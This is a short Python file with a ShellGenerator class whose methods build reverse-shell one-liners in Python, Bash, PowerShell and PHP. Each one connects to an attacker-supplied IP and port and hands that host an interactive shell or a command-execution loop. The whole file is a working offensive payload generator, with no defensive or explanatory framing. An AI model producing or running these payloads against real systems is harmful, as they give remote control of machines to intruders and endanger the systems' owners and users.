class ShellGenerator:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
    def python_shell(self):
        return f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.ip}',{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
    def bash_shell(self):
        return f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
    def powershell_shell(self):
        return f"$client = New-Object System.Net.Sockets.TCPClient('{self.ip}',{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    def php_shell(self):
        return f"php -r '$sock=fsockopen(\"{self.ip}\",{self.port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
